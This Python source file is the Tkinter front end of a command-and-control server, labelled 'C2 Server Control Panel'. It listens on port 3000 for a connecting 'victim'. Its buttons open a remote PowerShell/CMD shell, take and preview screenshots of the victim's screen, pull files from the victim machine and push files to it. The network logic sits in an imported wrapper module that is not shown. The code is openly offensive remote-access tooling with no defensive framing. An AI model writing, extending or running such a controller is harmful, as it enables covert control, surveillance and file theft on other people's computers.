import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import threading
import subprocess
import io
from pathlib import Path
from PIL import Image, ImageTk
import sv_ttk

# Import the wrapper module
try:
    from wrapper import C2Wrapper
    WRAPPER_LOADED = True
except ImportError as e:
    print(f"[ERR] Could not import C2Wrapper: {e}")
    WRAPPER_LOADED = False

C2_PORT = 3000  # Default port


class C2ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Server Control Panel")
        self.root.geometry("900x700")
        
        self.c2 = None
        self.connected = False
        
        if not WRAPPER_LOADED:
            messagebox.showerror(
                "Error", 
                "Failed to load C2Wrapper module"
            )
        
        self.setup_ui()
        
        if WRAPPER_LOADED:
            self.root.after(100, self.start_server)
        
    def setup_ui(self):
        # Main container with padding
        main_container = ttk.Frame(self.root, padding=10)
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Status frame
        status_frame = ttk.LabelFrame(main_container, text="Server Status", padding=15)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        status_inner = ttk.Frame(status_frame)
        status_inner.pack(fill=tk.X)
        
        ttk.Label(status_inner, text="Status:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.status_label = ttk.Label(
            status_inner, 
            text="Not Connected", 
            foreground="red", 
            font=("Arial", 11, "bold")
        )
        self.status_label.pack(side=tk.LEFT)
        
        self.client_info_label = ttk.Label(
            status_frame, 
            text="", 
            foreground="#4A9EFF",
            font=("Arial", 9)
        )
        self.client_info_label.pack(pady=(5, 0))
        
        # Connection control frame
        conn_frame = ttk.LabelFrame(main_container, text="Connection Control", padding=10)
        conn_frame.pack(fill=tk.X, pady=(0, 10))
        
        btn_container = ttk.Frame(conn_frame)
        btn_container.pack()
        
        self.start_btn = ttk.Button(
            btn_container, 
            text="▶ Start Server", 
            command=self.start_server,
            width=20
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(
            btn_container, 
            text="⬛ Stop Server", 
            command=self.stop_server, 
            state=tk.DISABLED,
            width=20
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Command buttons frame
        cmd_frame = ttk.LabelFrame(main_container, text="Available Commands", padding=15)
        cmd_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Create grid layout for commands
        commands = [
            {
                "text": "Shell",
                "desc": "Opens terminal window for PowerShell/CMD commands",
                "command": self.start_powershell,
                "var_name": "psh_btn"
            },
            {
                "text": "Take Screenshot",
                "desc": "Capture and preview victim's screen",
                "command": self.take_screenshot,
                "var_name": "screenshot_btn"
            },
            {
                "text": "⬇️ Download File",
                "desc": "Retrieve file from victim machine",
                "command": self.download_file,
                "var_name": "download_btn"
            },
            {
                "text": "⬆️ Upload File",
                "desc": "Send file to victim machine",
                "command": self.upload_file,
                "var_name": "upload_btn"
            }
        ]
        
        for i, cmd_info in enumerate(commands):
            cmd_container = ttk.Frame(cmd_frame)
            cmd_container.pack(fill=tk.X, pady=8)
            
            btn = ttk.Button(
                cmd_container,
                text=cmd_info["text"],
                command=cmd_info["command"],
                width=30,
                state=tk.DISABLED
            )
            btn.pack(side=tk.LEFT, padx=(0, 10))
            setattr(self, cmd_info["var_name"], btn)
            
            desc_label = ttk.Label(
                cmd_container,
                text=cmd_info["desc"],
                font=("Arial", 9),
                foreground="gray"
            )
            desc_label.pack(side=tk.LEFT)
        
        # Log frame
        log_frame = ttk.LabelFrame(main_container, text="Activity Log", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame, 
            height=12,
            state=tk.DISABLED, 
            wrap=tk.WORD,
            font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.log_text.tag_config("info", foreground="#4A9EFF")
        self.log_text.tag_config("success", foreground="#50C878")
        self.log_text.tag_config("error", foreground="#FF6B6B")
        
    def log(self, message, level="info"):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n", level)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
    def start_server(self):            
        self.start_btn.config(state=tk.DISABLED)
        
        try:
            self.c2 = C2Wrapper()
            
            self.log(f"Listening on 0.0.0.0:{C2_PORT}")
            self.status_label.config(text="Waiting for connection...", foreground="orange")
            self.root.update()
            
            self.c2.setup()
            self.connected = True
            
            self.log("Victim connected", "success")
            
            try:
                client_info = self.c2.get_client_info()
                if client_info:
                    first_line = client_info.split('\n')[0][:70]
                    self.client_info_label.config(text=first_line)
            except:
                pass
            
            self.status_label.config(text="Connected", foreground="green")
            self._enable_commands()
            self.stop_btn.config(state=tk.NORMAL)
            
        except Exception as e:
            self.log(f"Server error: {e}", "error")
            self.start_btn.config(state=tk.NORMAL)
            self.status_label.config(text="Connection Failed", foreground="red")
            
    def _enable_commands(self):
        """Enable all command buttons"""
        self.psh_btn.config(state=tk.NORMAL)
        self.screenshot_btn.config(state=tk.NORMAL)
        self.download_btn.config(state=tk.NORMAL)
        self.upload_btn.config(state=tk.NORMAL)
        
    def _disable_commands(self):
        """Disable all command buttons"""
        self.psh_btn.config(state=tk.DISABLED)
        self.screenshot_btn.config(state=tk.DISABLED)
        self.download_btn.config(state=tk.DISABLED)
        self.upload_btn.config(state=tk.DISABLED)
        
    def stop_server(self):
        if self.c2:
            try:
                self.c2.cleanup()
                self.log("Server stopped")
            except Exception as e:
                self.log(f"Cleanup error: {e}", "error")
            finally:
                self.c2 = None
                
        self.connected = False
        self.status_label.config(text="Disconnected", foreground="red")
        self.client_info_label.config(text="")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self._disable_commands()
        
    def start_powershell(self):
        """Start interactive shell - runs in blocking thread"""
        if not self.connected or not self.c2:
            messagebox.showwarning("Warning", "No active connection")
            return

        try:
            def run_shell():
                try:
                    print("Type 'quit' to exit shell")
                    self.c2.interactive_shell()
                    self.root.after(0, lambda: self.log("Shell session ended", "info"))
                    
                except Exception as e:
                    error_msg = f"Shell error: {e}"
                    print(f"\n{error_msg}\n")
                    self.root.after(0, lambda: self.log(error_msg, "error"))
            
            shell_thread = threading.Thread(target=run_shell, daemon=True)
            shell_thread.start()
            
            self.log("Shell started in terminal (check your console)", "success")

        except Exception as e:
            self.log(f"Shell error: {e}", "error")
            messagebox.showerror("Error", f"Failed to start shell:\n{e}")
            
    def take_screenshot(self):
        """Take screenshot from victim"""
        if not self.connected or not self.c2:
            messagebox.showwarning("Warning", "No active connection")
            return
        
        try:
            self.c2.take_screenshot()
            
            screenshot_files = sorted(
                Path('.').glob('screenshot_*.bmp'),
                key=lambda p: p.stat().st_mtime,
                reverse=True
            )
            
            if screenshot_files:
                latest_screenshot = screenshot_files[0]
                self.log(f"Screenshot saved: {latest_screenshot.name}", "success")
                
                with open(latest_screenshot, 'rb') as f:
                    img_data = f.read()
                    self._show_screenshot(img_data, str(latest_screenshot))
                
        except Exception as e:
            self.log(f"Screenshot error: {e}", "error")
            
    def _show_screenshot(self, img_data, filename):
        """Display screenshot in new window"""
        screenshot_window = tk.Toplevel(self.root)
        screenshot_window.title(f"Screenshot Preview - {filename}")
        screenshot_window.geometry("1100x800")
        
        try:
            img = Image.open(io.BytesIO(img_data))
            original_size = img.size
            
            max_size = (1050, 650)
            img.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(img)
            
            main_frame = ttk.Frame(screenshot_window, padding=10)
            main_frame.pack(fill=tk.BOTH, expand=True)
            
            info_frame = ttk.Frame(main_frame)
            info_frame.pack(fill=tk.X, pady=(0, 10))
            
            info_text = f"Original size: {original_size[0]}x{original_size[1]} | File: {filename}"
            ttk.Label(info_frame, text=info_text, font=("Arial", 9)).pack()
            
            img_frame = ttk.Frame(main_frame)
            img_frame.pack(fill=tk.BOTH, expand=True)
            
            canvas = tk.Canvas(img_frame, bg='#2b2b2b')
            scrollbar_y = ttk.Scrollbar(img_frame, orient=tk.VERTICAL, command=canvas.yview)
            scrollbar_x = ttk.Scrollbar(img_frame, orient=tk.HORIZONTAL, command=canvas.xview)
            
            canvas.configure(yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)
            
            scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
            scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)
            canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
            
            canvas.create_image(0, 0, anchor=tk.NW, image=photo)
            canvas.image = photo
            canvas.config(scrollregion=canvas.bbox(tk.ALL))
            
            btn_frame = ttk.Frame(main_frame)
            btn_frame.pack(fill=tk.X, pady=(10, 0))
            
            def save_screenshot():
                file_path = filedialog.asksaveasfilename(
                    defaultextension=".png",
                    initialfile=Path(filename).stem,
                    filetypes=[
                        ("PNG files", "*.png"),
                        ("JPEG files", "*.jpg *.jpeg"),
                        ("BMP files", "*.bmp"),
                        ("All files", "*.*")
                    ]
                )
                if file_path:
                    orig_img = Image.open(io.BytesIO(img_data))
                    orig_img.save(file_path)
                    self.log(f"Screenshot saved: {file_path}", "success")
                    messagebox.showinfo("Success", f"Screenshot saved to:\n{file_path}")
            
            save_btn = ttk.Button(btn_frame, text="💾 Save As...", command=save_screenshot, width=20)
            save_btn.pack(side=tk.LEFT, padx=5)
            
            close_btn = ttk.Button(btn_frame, text="✖ Close", command=screenshot_window.destroy, width=20)
            close_btn.pack(side=tk.LEFT, padx=5)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to display screenshot:\n{e}")
            screenshot_window.destroy()
            self.log(f"Display error: {e}", "error")
            
    def download_file(self):
        """Download file from victim"""
        if not self.connected or not self.c2:
            messagebox.showwarning("Warning", "No active connection")
            return
        
        remote_path = simpledialog.askstring(
            "Download File",
            "Enter remote file path on victim machine:\n"
            "(e.g., C:\\Users\\victim\\Desktop\\document.txt)",
            parent=self.root
        )
        
        if not remote_path:
            return
        
        local_path = filedialog.asksaveasfilename(
            title="Save downloaded file as",
            initialfile=Path(remote_path).name,
            defaultextension=Path(remote_path).suffix
        )
        
        if not local_path:
            return
        
        try:
            self.c2.download_file(remote_path, local_path)
            
            if Path(local_path).exists():
                file_size = Path(local_path).stat().st_size
                self.log(f"Downloaded: {Path(local_path).name} ({file_size} bytes)", "success")
                messagebox.showinfo(
                    "Success",
                    f"File downloaded successfully!\n\n"
                    f"Saved to: {local_path}\n"
                    f"Size: {file_size} bytes"
                )
                
        except Exception as e:
            self.log(f"Download error: {e}", "error")
            messagebox.showerror(
                "Download Failed",
                f"Failed to download file:\n{e}"
            )
            
    def upload_file(self):
        """Upload file to victim"""
        if not self.connected or not self.c2:
            messagebox.showwarning("Warning", "No active connection")
            return
        
        local_path = filedialog.askopenfilename(
            title="Select file to upload"
        )
        
        if not local_path:
            return
        
        default_name = Path(local_path).name
        remote_path = simpledialog.askstring(
            "Upload File",
            f"Enter destination path on victim machine:\n"
            f"(e.g., C:\\Temp\\{default_name})",
            initialvalue=f"C:\\Temp\\{default_name}",
            parent=self.root
        )
        
        if not remote_path:
            return
        
        try:
            self.c2.upload_file(local_path, remote_path)
            file_size = Path(local_path).stat().st_size
            self.log(f"Uploaded: {Path(local_path).name} ({file_size} bytes)", "success")
            messagebox.showinfo(
                "Success",
                f"File uploaded successfully!\n\n"
                f"Remote path: {remote_path}"
            )
            
        except Exception as e:
            self.log(f"Upload error: {e}", "error")
            messagebox.showerror(
                "Upload Failed",
                f"Failed to upload file:\n{e}"
            )


def main():
    root = tk.Tk()
    
    try:
        sv_ttk.set_theme("dark")
    except:
        pass
    
    app = C2ServerGUI(root)
    
    def on_closing():
        if app.connected:
            if messagebox.askokcancel("Quit", "Active connection will be closed. Continue?"):
                app.stop_server()
                root.destroy()
        else:
            root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()